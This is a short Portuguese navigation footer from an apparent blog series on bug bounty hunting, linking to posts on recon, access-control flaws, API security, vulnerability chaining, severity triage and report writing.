*Relacionado na série: [Índice da série](/posts/guia-bug-bounty/) · [Recon & Discovery](/posts/recon-discovery/) · [Broken Access Control: IDOR, BOLA e BFLA](/posts/broken-access-control-idor-bola-bfla/) · [Business Logic](/posts/business-logic/) · [Segurança de APIs](/posts/api-security/) · [Chaining](/posts/chaining-vulnerabilidades/) · [Severidade & Impacto](/posts/severidade-impacto-triagem/) · [Como escrever um report que paga](/posts/como-escrever-report-que-paga/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
